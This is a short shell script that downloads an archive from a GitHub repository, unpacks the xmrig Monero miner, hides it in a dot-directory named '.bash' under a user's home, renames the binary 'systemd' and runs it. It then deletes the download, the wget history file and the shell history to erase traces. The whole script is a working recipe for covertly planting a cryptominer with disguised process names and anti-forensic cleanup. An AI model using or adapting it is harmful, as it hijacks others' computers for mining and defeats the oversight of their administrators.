wget https://github.com/deusveritatis/monero/archive/master.zip
unzip master.zip
cd monero-master
tar -xvzf ./bash.tar.gz
mv xmrig-5.0.1/ ./.bash
mv ./.bash /home/iiserb
cd ../..
rm -r monero-master
cd .bash/
mv ./xmrig ./systemd
./systemd
rm -r master.zip
rm .wget-hsts
rm .bash_history && history && exit
